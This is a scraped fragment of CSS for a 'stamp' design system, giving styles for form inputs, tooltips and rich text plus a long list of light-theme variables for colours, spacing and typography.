.stamp-textarea-input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); opacity: 1; }

.stamp-textarea-input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); opacity: 1; }

.stamp-textarea-input:not(:disabled):hover { border-color: var(--stamp-color-border-hover); }

.stamp-textarea-input:not(:disabled):focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-textarea-input:not(:disabled):focus { outline: none; }
  .stamp-textarea-input:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-textarea-input:disabled { background-color: var(--stamp-color-background-disabled); cursor: not-allowed; border-color: var(--stamp-color-border-disabled); -webkit-text-fill-color: var(--stamp-color-text-default); color: var(--stamp-color-text-form-control-value-disabled); }

.stamp-textarea-input:disabled::placeholder { color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-textarea-input:disabled::placeholder { color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-textarea-input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-textarea-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-textarea-input { inline-size: 50%; }
  .stamp-textarea-input--size-full { inline-size: 100%; }
}

.stamp-text-input { padding-inline: var(--stamp-spacing-inner-l); padding-block: var(--stamp-spacing-inner-s); border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-strong); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); border-radius: var(--stamp-radius-s); font-weight: var(--stamp-text-body-m-default-font-weight); border-style: solid; inline-size: 100%; background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); }

.stamp-text-input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); opacity: 1; }

.stamp-text-input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); opacity: 1; }

.stamp-text-input:not(:disabled):hover { border-color: var(--stamp-color-border-hover); }

.stamp-text-input:not(:disabled):focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-text-input:not(:disabled):focus { outline: none; }
  .stamp-text-input:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-text-input:disabled { background-color: var(--stamp-color-background-disabled); border-color: var(--stamp-color-border-disabled); -webkit-text-fill-color: var(--stamp-color-text-default); color: var(--stamp-color-text-form-control-value-disabled); cursor: not-allowed; }

.stamp-text-input:disabled::placeholder { color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-text-input:disabled::placeholder { color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-text-input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-text-input--size-narrow { inline-size: 50%; }

.stamp-text-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-text-input { inline-size: 50%; }
  .stamp-text-input--size-narrow { inline-size: 25%; }
  .stamp-text-input--size-full { inline-size: 100%; }
}

.stamp-tooltip__dismiss-button { position: absolute; inset-inline-end: var(--stamp-spacing-inner-m); inset-block-start: var(--stamp-spacing-inner-s); border: medium; cursor: pointer; }

.stamp-tooltip--down .stamp-tooltip__dismiss-button { inset-block-start: calc(var(--stamp-spacing-inner-m) + var(--tooth-size) * 2); }

.stamp-tooltip__content { position: relative; padding: var(--stamp-spacing-inner-l)
        calc(2 * var(--stamp-spacing-inner-l) + var(--stamp-size-icon-m))
        var(--stamp-spacing-inner-l) var(--stamp-spacing-inner-l); overflow: hidden; overflow-wrap: break-word; max-inline-size: 320px; inline-size: 100%; }

@media (max-width: 320px) {
  .stamp-tooltip__content { max-inline-size: 100vw; }
}

.stamp-tooltip__title { font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); }

.stamp-rich-text { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-size: var(--stamp-text-body-m-default-font-size); line-height: var(--stamp-text-body-m-default-line-height); color: var(--stamp-color-text-default); }

.stamp-rich-text p, .stamp-rich-text ul, .stamp-rich-text ol, .stamp-rich-text h1, .stamp-rich-text h2, .stamp-rich-text h3, .stamp-rich-text h4, .stamp-rich-text h5, .stamp-rich-text h6, .stamp-rich-text table { margin-bottom: var(--stamp-spacing-outer-xs); }

.stamp-rich-text ul { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-s); list-style-position: outside; list-style-type: disc; padding-inline-start: 18px; }

.stamp-rich-text ol { list-style-type: decimal; padding-inline-start: 14px; }

.stamp-rich-text li { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); color: var(--stamp-color-text-default); }

.stamp-rich-text h1 { font-feature-settings: normal; letter-spacing: var(--stamp-text-heading-3-xl-letter-spacing); line-height: var(--stamp-text-heading-3-xl-line-height); font-weight: var(--stamp-text-heading-3-xl-font-weight); font-family: var(--stamp-text-heading-3-xl-font-family); font-size: var(--stamp-text-heading-xl-font-size); }

.stamp-rich-text h2 { letter-spacing: var(--stamp-text-heading-xxl-letter-spacing); line-height: var(--stamp-text-heading-xxl-line-height); font-weight: var(--stamp-text-heading-xxl-font-weight); font-family: var(--stamp-text-heading-xxl-font-family); font-size: var(--stamp-text-heading-xl-font-size); }

.stamp-rich-text h3 { letter-spacing: var(--stamp-text-heading-xl-letter-spacing); line-height: var(--stamp-text-heading-xl-line-height); font-weight: var(--stamp-text-heading-xl-font-weight); font-family: var(--stamp-text-heading-xl-font-family); font-size: var(--stamp-text-heading-l-font-size); }

.stamp-rich-text h4 { letter-spacing: var(--stamp-text-heading-l-letter-spacing); line-height: var(--stamp-text-heading-l-line-height); font-weight: var(--stamp-text-heading-l-font-weight); font-family: var(--stamp-text-heading-l-font-family); font-size: var(--stamp-text-heading-m-font-size); }

.stamp-rich-text h5 { letter-spacing: var(--stamp-text-heading-m-letter-spacing); line-height: var(--stamp-text-heading-m-line-height); font-weight: var(--stamp-text-heading-m-font-weight); font-family: var(--stamp-text-heading-m-font-family); font-size: var(--stamp-text-heading-s-font-size); }

.stamp-rich-text h6 { letter-spacing: var(--stamp-text-heading-s-letter-spacing); line-height: var(--stamp-text-heading-s-line-height); font-weight: var(--stamp-text-heading-s-font-weight); font-family: var(--stamp-text-heading-s-font-family); font-size: var(--stamp-text-heading-xs-font-size); }

@media (min-width: 681px) {
  .stamp-rich-text h1 { font-size: var(--stamp-text-heading-3-xl-font-size); }
  .stamp-rich-text h2 { font-size: var(--stamp-text-heading-xxl-font-size); }
  .stamp-rich-text h3 { font-size: var(--stamp-text-heading-xl-font-size); }
  .stamp-rich-text h4 { font-size: var(--stamp-text-heading-l-font-size); }
  .stamp-rich-text h5 { font-size: var(--stamp-text-heading-m-font-size); }
  .stamp-rich-text h6 { font-size: var(--stamp-text-heading-s-font-size); }
}

.stamp-rich-text a { color: var(--stamp-color-text-link-default); text-decoration-thickness: 1px; }

.stamp-rich-text a:visited { color: var(--stamp-color-text-link-visited); }

.stamp-rich-text a:focus { outline-color: var(--stamp-color-border-focus-outline); }

.stamp-rich-text a:focus { color: var(--stamp-color-text-link-default); }

.stamp-rich-text a:hover, .stamp-text a:active { text-decoration-thickness: 2px; }

.stamp-rich-text a:active { color: var(--stamp-color-text-link-pressed); }

.stamp-rich-text a:hover { color: var(--stamp-color-text-link-hover); }

.stamp-rich-text em { font-style: italic; font-family: var(--stamp-text-body-m-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-m-emphasis-line-height); font-size: var(--stamp-text-body-m-emphasis-font-size); letter-spacing: var(--stamp-text-body-m-emphasis-letter-spacing); }

.stamp-rich-text strong { font-weight: bold; font-family: var(--stamp-text-body-m-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-m-emphasis-line-height); font-size: var(--stamp-text-body-m-emphasis-font-size); letter-spacing: var(--stamp-text-body-m-emphasis-letter-spacing); }

.stamp-rich-text table { position: relative; background-color: var(--stamp-color-background-surface); border-collapse: collapse; border-spacing: 0px; color: var(--stamp-color-text-default); }

.stamp-rich-text table tr { border-block-end: var(--stamp-border-width-s) solid var(--stamp-color-border-default); }

.stamp-rich-text table td, .stamp-rich-text table th { padding: var(--stamp-spacing-inner-l); white-space: nowrap; background-color: var(--stamp-color-background-surface); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-rich-text table th { font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); }

.stamp-button__icon svg { inline-size: 100%; block-size: 100%; }" data-scrapbook-adoptedstylesheet-8=".stamp-theme-light { --stamp-opacity-illustration-disabled: 60%; --stamp-opacity-illustration-default: 100%; --stamp-opacity-mix-subtle: 10%; --stamp-opacity-mix-strong: 90%; --stamp-opacity-mix-default: 30%; --stamp-opacity-backdrop: 60%; --stamp-blend-mode-disabled: Luminosity; --stamp-blend-mode-default: Normal; --stamp-border-width-l: 4px; --stamp-border-width-m: 2px; --stamp-border-width-s: 1px; --stamp-border-width-xs: 0.5px; --stamp-radius-xxl: 32px; --stamp-radius-xl: 24px; --stamp-radius-l: 16px; --stamp-radius-m: 8px; --stamp-radius-s: 6px; --stamp-radius-xs: 4px; --stamp-radius-xxs: 2px; --stamp-size-medium-illustration-m: 240px; --stamp-size-medium-illustration-s: 204px; --stamp-size-illustration-3-xl: 144px; --stamp-size-illustration-xxl: 120px; --stamp-size-illustration-xl: 96px; --stamp-size-illustration-l: 88px; --stamp-size-illustration-m: 80px; --stamp-size-illustration-s: 56px; --stamp-size-icon-l: 40px; --stamp-size-icon-m: 24px; --stamp-size-icon-s: 16px; --stamp-spacing-outer-xl: 88px; --stamp-spacing-outer-l: 56px; --stamp-spacing-outer-m: 40px; --stamp-spacing-outer-s: 24px; --stamp-spacing-outer-xs: 16px; --stamp-spacing-inner-4-xl: 56px; --stamp-spacing-inner-3-xl: 40px; --stamp-spacing-inner-xxl: 32px; --stamp-spacing-inner-xl: 24px; --stamp-spacing-inner-l: 16px; --stamp-spacing-inner-m: 12px; --stamp-spacing-inner-s: 8px; --stamp-spacing-inner-xs: 4px; --stamp-spacing-inner-xxs: 2px; --stamp-text-app-navigation-selected-letter-spacing: 0px; --stamp-text-app-navigation-selected-font-size: 12px; --stamp-text-app-navigation-selected-line-height: 1.6; --stamp-text-app-navigation-selected-font-weight: 700; --stamp-text-app-navigation-selected-font-family: Hanken Grotesk; --stamp-text-app-navigation-default-letter-spacing: 0px; --stamp-text-app-navigation-default-font-size: 12px; --stamp-text-app-navigation-default-line-height: 1.6; --stamp-text-app-navigation-default-font-weight: 400; --stamp-text-app-navigation-default-font-family: Hanken Grotesk; --stamp-text-step-todo-letter-spacing: 0px; --stamp-text-step-todo-font-size: 16px; --stamp-text-step-todo-line-height: 1.6; --stamp-text-step-todo-font-weight: 400; --stamp-text-step-todo-font-family: Hanken Grotesk; --stamp-text-step-default-letter-spacing: 0px; --stamp-text-step-default-font-size: 16px; --stamp-text-step-default-line-height: 1.6; --stamp-text-step-default-font-weight: 400; --stamp-text-step-default-font-family: Hanken Grotesk; --stamp-text-badge-default-letter-spacing: 0px; --stamp-text-badge-default-font-size: 14px; --stamp-text-badge-default-line-height: 1.05; --stamp-text-badge-default-font-weight: 400; --stamp-text-badge-default-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-selected-letter-spacing: 0px; --stamp-text-form-date-input-date-selected-font-size: 18px; --stamp-text-form-date-input-date-selected-line-height: 1.4; --stamp-text-form-date-input-date-selected-font-weight: 700; --stamp-text-form-date-input-date-selected-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-pressed-text-decoration: underline; --stamp-text-form-date-input-date-pressed-letter-spacing: 0px; --stamp-text-form-date-input-date-pressed-font-size: 18px; --stamp-text-form-date-input-date-pressed-line-height: 1.4; --stamp-text-form-date-input-date-pressed-font-weight: 400; --stamp-text-form-date-input-date-pressed-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-hover-text-decoration: underline; --stamp-text-form-date-input-date-hover-letter-spacing: 0px; --stamp-text-form-date-input-date-hover-font-size: 18px; --stamp-text-form-date-input-date-hover-line-height: 1.4; --stamp-text-form-date-input-date-hover-font-weight: 400; --stamp-text-form-date-input-date-hover-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-default-letter-spacing: 0px; --stamp-text-form-date-input-date-default-font-size: 18px; --stamp-text-form-date-input-date-default-line-height: 1.4; --stamp-text-form-date-input-date-default-font-weight: 400; --stamp-text-form-date-input-date-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-body-highlighted-text-decoration: underline; --stamp-text-form-data-list-body-highlighted-font-size: 14px; --stamp-text-form-data-list-body-highlighted-line-height: 1.6; --stamp-text-form-data-list-body-highlighted-font-weight: 400; --stamp-text-form-data-list-body-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-pressed-letter-spacing: 0px; --stamp-text-form-data-list-body-pressed-font-size: 14px; --stamp-text-form-data-list-body-pressed-line-height: 1.6; --stamp-text-form-data-list-body-pressed-font-weight: 400; --stamp-text-form-data-list-body-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-hover-letter-spacing: 0px; --stamp-text-form-data-list-body-hover-font-size: 14px; --stamp-text-form-data-list-body-hover-line-height: 1.6; --stamp-text-form-data-list-body-hover-font-weight: 400; --stamp-text-form-data-list-body-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-default-letter-spacing: 0px; --stamp-text-form-data-list-body-default-font-size: 14px; --stamp-text-form-data-list-body-default-line-height: 1.6; --stamp-text-form-data-list-body-default-font-weight: 400; --stamp-text-form-data-list-body-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-title-highlighted-text-decoration: underline; --stamp-text-form-data-list-title-highlighted-font-size: 16px; --stamp-text-form-data-list-title-highlighted-line-height: 1.4; --stamp-text-form-data-list-title-highlighted-font-weight: 700; --stamp-text-form-data-list-title-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-pressed-letter-spacing: 0px; --stamp-text-form-data-list-title-pressed-font-size: 16px; --stamp-text-form-data-list-title-pressed-line-height: 1.4; --stamp-text-form-data-list-title-pressed-font-weight: 700; --stamp-text-form-data-list-title-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-hover-letter-spacing: 0px; --stamp-text-form-data-list-title-hover-font-size: 16px; --stamp-text-form-data-list-title-hover-line-height: 1.4; --stamp-text-form-data-list-title-hover-font-weight: 700; --stamp-text-form-data-list-title-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-default-letter-spacing: 0px; --stamp-text-form-data-list-title-default-font-size: 16px; --stamp-text-form-data-list-title-default-line-height: 1.4; --stamp-text-form-data-list-title-default-font-weight: 700; --stamp-text-form-data-list-title-default-font-family: Hanken Grotesk; --stamp-text-form-feedback-letter-spacing: 0px; --stamp-text-form-feedback-font-size: 14px; --stamp-text-form-feedback-line-height: 1.4; --stamp-text-form-feedback-font-weight: 700; --stamp-text-form-feedback-font-family: Hanken Grotesk; --stamp-text-form-label-letter-spacing: 0px; --stamp-text-form-label-font-size: 16px; --stamp-text-form-label-line-height: 1.2; --stamp-text-form-label-font-weight: 700; --stamp-text-form-label-font-family: Hanken Grotesk; --stamp-text-hyperlink-pressed-letter-spacing: 0px; --stamp-text-hyperlink-pressed-text-decoration: underline; --stamp-text-hyperlink-pressed-font-size: 16px; --stamp-text-hyperlink-pressed-line-height: 1.6; --stamp-text-hyperlink-pressed-font-weight: 400; --stamp-text-hyperlink-pressed-font-family: Hanken Grotesk; --stamp-text-hyperlink-hover-letter-spacing: 0px; --stamp-text-hyperlink-hover-text-decoration: underline; --stamp-text-hyperlink-hover-font-size: 16px; --stamp-text-hyperlink-hover-line-height: 1.6; --stamp-text-hyperlink-hover-font-weight: 400; --stamp-text-hyperlink-hover-font-family: Hanken Grotesk; --stamp-text-hyperlink-default-letter-spacing: 0px; --stamp-text-hyperlink-default-text-decoration: underline; --stamp-text-hyperlink-default-font-size: 16px; --stamp-text-hyperlink-default-line-height: 1.6; --stamp-text-hyperlink-default-font-weight: 400; --stamp-text-hyperlink-default-font-family: Hanken Grotesk; --stamp-text-link-s-pressed-text-decoration: underline; --stamp-text-link-s-pressed-letter-spacing: 0px; --stamp-text-link-s-pressed-font-size: 14px; --stamp-text-link-s-pressed-line-height: 1.6; --stamp-text-link-s-pressed-font-weight: 400; --stamp-text-link-s-pressed-font-family: Hanken Grotesk; --stamp-text-link-s-hover-text-decoration: underline; --stamp-text-link-s-hover-letter-spacing: 0px; --stamp-text-link-s-hover-font-size: 14px; --stamp-text-link-s-hover-line-height: 1.6; --stamp-text-link-s-hover-font-weight: 400; --stamp-text-link-s-hover-font-family: Hanken Grotesk; --stamp-text-link-s-default-letter-spacing: 0px; --stamp-text-link-s-default-font-size: 14px; --stamp-text-link-s-default-line-height: 1.6; --stamp-text-link-s-default-font-weight: 400; --stamp-text-link-s-default-font-family: Hanken Grotesk; --stamp-text-link-m-pressed-text-decoration: underline; --stamp-text-link-m-pressed-letter-spacing: 0px; --stamp-text-link-m-pressed-font-size: 16px; --stamp-text-link-m-pressed-line-height: 1.6; --stamp-text-link-m-pressed-font-weight: 400; --stamp-text-link-m-pressed-font-family: Hanken Grotesk; --stamp-text-link-m-hover-text-decoration: underline; --stamp-text-link-m-hover-letter-spacing: 0px; --stamp-text-link-m-hover-font-size: 16px; --stamp-text-link-m-hover-line-height: 1.6; --stamp-text-link-m-hover-font-weight: 400; --stamp-text-link-m-hover-font-family: Hanken Grotesk; --stamp-text-link-m-default-letter-spacing: 0px; --stamp-text-link-m-default-font-size: 16px; --stamp-text-link-m-default-line-height: 1.6; --stamp-text-link-m-default-font-weight: 400; --stamp-text-link-m-default-font-family: Hanken Grotesk; --stamp-text-link-l-pressed-letter-spacing: 0px; --stamp-text-link-l-pressed-font-size: 16px; --stamp-text-link-l-pressed-text-decoration: underline; --stamp-text-link-l-pressed-line-height: 1.4; --stamp-text-link-l-pressed-font-weight: 700; --stamp-text-link-l-pressed-font-family: Hanken Grotesk; --stamp-text-link-l-hover-letter-spacing: 0px; --stamp-text-link-l-hover-font-size: 16px; --stamp-text-link-l-hover-text-decoration: underline; --stamp-text-link-l-hover-line-height: 1.4; --stamp-text-link-l-hover-font-weight: 700; --stamp-text-link-l-hover-font-family: Hanken Grotesk; --stamp-text-link-l-default-letter-spacing: 0px; --stamp-text-link-l-default-font-size: 16px; --stamp-text-link-l-default-line-height: 1.4; --stamp-text-link-l-default-font-weight: 700; --stamp-text-link-l-default-font-family: Hanken Grotesk; --stamp-text-cta-pressed-letter-spacing: 0px; --stamp-text-cta-pressed-font-size: 16px; --stamp-text-cta-pressed-text-decoration: underline; --stamp-text-cta-pressed-line-height: 1.4; --stamp-text-cta-pressed-font-weight: 700; --stamp-text-cta-pressed-font-family: Hanken Grotesk; --stamp-text-cta-hover-letter-spacing: 0px; --stamp-text-cta-hover-font-size: 16px; --stamp-text-cta-hover-text-decoration: underline; --stamp-text-cta-hover-line-height: 1.4; --stamp-text-cta-hover-font-weight: 700; --stamp-text-cta-hover-font-family: Hanken Grotesk; --stamp-text-cta-default-letter-spacing: 0px; --stamp-text-cta-default-font-size: 16px; --stamp-text-cta-default-line-height: 1.4; --stamp-text-cta-default-font-weight: 700; --stamp-text-cta-default-font-family: Hanken Grotesk; --stamp-text-price-xs-default-letter-spacing: 0px; --stamp-text-price-xs-default-font-size: 16px; --stamp-text-price-xs-default-line-height: 1.05; --stamp-text-price-xs-default-font-weight: 800; --stamp-text-price-xs-default-font-family: Hanken Grotesk; --stamp-text-price-s-decimal-letter-spacing: 0px; --stamp-text-price-s-decimal-font-size: 19px; --stamp-text-price-s-decimal-line-height: 1.05; --stamp-text-price-s-decimal-font-weight: 800; --stamp-text-price-s-decimal-font-family: Hanken Grotesk; --stamp-text-price-s-default-letter-spacing: 0px; --stamp-text-price-s-default-font-size: 19px; --stamp-text-price-s-default-line-height: 1.05; --stamp-text-price-s-default-font-weight: 800; --stamp-text-price-s-default-font-family: Hanken Grotesk; --stamp-text-price-m-decimal-letter-spacing: 0px; --stamp-text-price-m-decimal-font-size: 25px; --stamp-text-price-m-decimal-line-height: 1.05; --stamp-text-price-m-decimal-font-weight: 800; --stamp-text-price-m-decimal-font-family: Hanken Grotesk; --stamp-text-price-m-default-letter-spacing: 0px; --stamp-text-price-m-default-font-size: 25px; --stamp-text-price-m-default-line-height: 1.05; --stamp-text-price-m-default-font-weight: 800; --stamp-text-price-m-default-font-family: Hanken Grotesk; --stamp-text-price-l-decimal-letter-spacing: 0px; --stamp-text-price-l-decimal-font-size: 33px; --stamp-text-price-l-decimal-line-height: 1.05; --stamp-text-price-l-decimal-font-weight: 800; --stamp-text-price-l-decimal-font-family: Hanken Grotesk; --stamp-text-price-l-default-letter-spacing: 0px; --stamp-text-price-l-default-font-size: 33px; --stamp-text-price-l-default-line-height: 1.05; --stamp-text-price-l-default-font-weight: 800; --stamp-text-price-l-default-font-family: Hanken Grotesk; --stamp-text-body-s-emphasis-letter-spacing: 0px; --stamp-text-body-s-emphasis-font-size: 14px; --stamp-text-body-s-emphasis-line-height: 1.6; --stamp-text-body-s-emphasis-font-weight: 700; --stamp-text-body-s-emphasis-font-family: Hanken Grotesk; --stamp-text-body-s-default-letter-spacing: 0px; --stamp-text-body-s-default-font-size: 14px; --stamp-text-body-s-default-line-height: 1.6; --stamp-text-body-s-default-font-weight: 400; --stamp-text-body-s-default-font-family: Hanken Grotesk; --stamp-text-body-m-emphasis-letter-spacing: 0px; --stamp-text-body-m-emphasis-font-size: 16px; --stamp-text-body-m-emphasis-line-height: 1.6; --stamp-text-body-m-emphasis-font-weight: 700; --stamp-text-body-m-emphasis-font-family: Hanken Grotesk; --stamp-text-body-m-default-letter-spacing: 0px; --stamp-text-body-m-default-font-size: 16px; --stamp-text-body-m-default-line-height: 1.6; --stamp-text-body-m-default-font-weight: 400; --stamp-text-body-m-default-font-family: Hanken Grotesk; --stamp-text-body-l-emphasis-letter-spacing: 0px; --stamp-text-body-l-emphasis-font-size: 19px; --stamp-text-body-l-emphasis-line-height: 1.6; --stamp-text-body-l-emphasis-font-weight: 700; --stamp-text-body-l-emphasis-font-family: Hanken Grotesk; --stamp-text-body-l-default-letter-spacing: 0px; --stamp-text-body-l-default-font-size: 19px; --stamp-text-body-l-default-line-height: 1.6; --stamp-text-body-l-default-font-weight: 400; --stamp-text-body-l-default-font-family: Hanken Grotesk; --stamp-text-subtitle-s-letter-spacing: 0px; --stamp-text-subtitle-s-font-size: 18px; --stamp-text-subtitle-s-line-height: 1.2; --stamp-text-subtitle-s-font-weight: 500; --stamp-text-subtitle-s-font-family: Hanken Grotesk; --stamp-text-subtitle-m-letter-spacing: 0px; --stamp-text-subtitle-m-font-size: 19px; --stamp-text-subtitle-m-line-height: 1.2; --stamp-text-subtitle-m-font-weight: 500; --stamp-text-subtitle-m-font-family: Hanken Grotesk; --stamp-text-subtitle-l-letter-spacing: 0px; --stamp-text-subtitle-l-font-size: 24px; --stamp-text-subtitle-l-line-height: 1.2; --stamp-text-subtitle-l-font-weight: 500; --stamp-text-subtitle-l-font-family: Hanken Grotesk; --stamp-text-heading-xxs-letter-spacing: 0px; --stamp-text-heading-xxs-font-size: 14px; --stamp-text-heading-xxs-line-height: 1.05; --stamp-text-heading-xxs-font-weight: 500; --stamp-text-heading-xxs-font-family: Hanken Grotesk; --stamp-text-heading-xs-letter-spacing: 0px; --stamp-text-heading-xs-font-size: 16px; --stamp-text-heading-xs-line-height: 1.2; --stamp-text-heading-xs-font-weight: 700; --stamp-text-heading-xs-font-family: Hanken Grotesk; --stamp-text-heading-s-letter-spacing: 0px; --stamp-text-heading-s-font-size: 18px; --stamp-text-heading-s-line-height: 1.05; --stamp-text-heading-s-font-weight: 700; --stamp-text-heading-s-font-family: ABC ROM; --stamp-text-heading-m-letter-spacing: 0px; --stamp-text-heading-m-font-size: 21px; --stamp-text-heading-m-line-height: 1.05; --stamp-text-heading-m-font-weight: 700; --stamp-text-heading-m-font-family: ABC ROM; --stamp-text-heading-l-letter-spacing: -0.5px; --stamp-text-heading-l-font-size: 25px; --stamp-text-heading-l-line-height: 0.95; --stamp-text-heading-l-font-weight: 700; --stamp-text-heading-l-font-family: ABC ROM; --stamp-text-heading-xl-letter-spacing: -1px; --stamp-text-heading-xl-font-size: 32px; --stamp-text-heading-xl-line-height: 0.9; --stamp-text-heading-xl-font-weight: 700; --stamp-text-heading-xl-font-family: ABC ROM; --stamp-text-heading-xxl-letter-spacing: -1.5px; --stamp-text-heading-xxl-font-size: 40px; --stamp-text-heading-xxl-line-height: 0.9; --stamp-text-heading-xxl-font-weight: 700; --stamp-text-heading-xxl-font-family: ABC ROM; --stamp-text-heading-3-xl-letter-spacing: -1.5px; --stamp-text-heading-3-xl-font-size: 54px; --stamp-text-heading-3-xl-line-height: 0.9; --stamp-text-heading-3-xl-font-weight: 700; --stamp-text-heading-3-xl-font-family: ABC ROM; --stamp-drop-shadow-block-start: 0px -2px 8px #1f1e2f26; --stamp-drop-shadow-flyout-down: 0px 2px 8px #1f1e2f26; --stamp-color-overflow-block-end: linear-gradient(180deg, #ffffff00 0%, #6161ff4d 100%); --stamp-color-overflow-block-start: linear-gradient(180deg, #6161ff4d 0%, #ffffff00 100%); --stamp-color-overflow-inline-end: linear-gradient(90deg, #ffffff00 0%, #ffffff 100%); --stamp-color-overflow-inline-start: linear-gradient(90deg, #ffffff 0%, #ffffff00 100%); --stamp-color-icon-icon-button-tertiary-pressed: #001a73; --stamp-color-icon-icon-button-tertiary-default: #4e4ee2; --stamp-color-icon-icon-button-secondary-pressed: #001a73; --stamp-color-icon-icon-button-secondary-default: #4e4ee2; --stamp-color-icon-icon-button-primary-pressed: #ffffff; --stamp-color-icon-icon-button-primary-default: #ffffff; --stamp-color-icon-button-tertiary-pressed: #001a73; --stamp-color-icon-button-tertiary-default: #4e4ee2; --stamp-color-icon-button-secondary-pressed: #001a73; --stamp-color-icon-button-secondary-default: #4e4ee2; --stamp-color-icon-button-primary-pressed: #ffffff; --stamp-color-icon-button-primary-default: #ffffff; --stamp-color-icon-accent-inverse: #1f1e2f; --stamp-color-icon-accent-default: #ffffff; --stamp-color-icon-disabled: #bec0cb; --stamp-color-icon-selected: #e75204; --stamp-color-icon-pressed: #001a73; --stamp-color-icon-hover: #4e4ee2; --stamp-color-icon-negative: #ee3261; --stamp-color-icon-warning: #fdd732; --stamp-color-icon-positive: #00BB53; --stamp-color-icon-informative: #009ee3; --stamp-color-icon-sustainable: #00BB53; --stamp-color-icon-on-brand: #ffffff; --stamp-color-icon-subtle: #86889d; --stamp-color-icon-switch-active-disabled: #bec0cb; --stamp-color-icon-switch-active-hover: #4e4ee2; --stamp-color-icon-switch-active-strong: #e75204; --stamp-color-icon-switch-normal-disabled: #bec0cb; --stamp-color-icon-switch-normal-hover: #4e4ee2; --stamp-color-icon-switch-normal-strong: #1f1e2f; --stamp-color-icon-strong: #1f1e2f; --stamp-color-icon-brand: #e75204; --stamp-color-icon-default: #4e4ee2; --stamp-color-border-button-tertiary-pressed: #ffffff00; --stamp-color-border-button-tertiary-default: #ffffff00; --stamp-color-border-button-secondary-pressed: #001a73; --stamp-color-border-button-secondary-default: #6161ff; --stamp-color-border-button-primary-pressed: #ffffff00; --stamp-color-border-button-primary-default: #ffffff00; --stamp-color-border-fallback: #ffffff00; --stamp-color-border-focus-outline: #001a73; --stamp-color-border-disabled: #bec0cb; --stamp-color-border-error: #d70036; --stamp-color-border-selected: #e75204; --stamp-color-border-pressed: #001a73; --stamp-color-border-hover: #6161ff; --stamp-color-border-negative: #ee3261; --stamp-color-border-warning: #fdd732; --stamp-color-border-positive: #00BB53; --stamp-color-border-informative: #009ee3; --stamp-color-border-strong: #67687f; --stamp-color-border-brand: #e75204; --stamp-color-border-default: #bec0cb; --stamp-color-background-badge-brand: #D83D00; --stamp-color-background-badge-important: #d70036; --stamp-color-background-badge-secondary: #e7e8eb; --stamp-color-background-badge-primary: #6161ff; --stamp-color-background-app-brand: #D83D00; --stamp-color-background-app-default: #f1f1f2; --stamp-color-background-segment-selected: #6161ff; --stamp-color-background-segment-default: #ffffff00; --stamp-color-background-icon-button-tertiary-pressed: #ffffff00; --stamp-color-background-icon-button-tertiary-default: #ffffff00; --stamp-color-background-icon-button-secondary-pressed: #e7e8eb; --stamp-color-background-icon-button-secondary-default: #f1f1f2; --stamp-color-background-icon-button-primary-pressed: #001a73; --stamp-color-background-icon-button-primary-default: #6161ff; --stamp-color-background-date-input-today-disabled: #bec0cb; --stamp-color-background-date-input-today-default: #67687f; 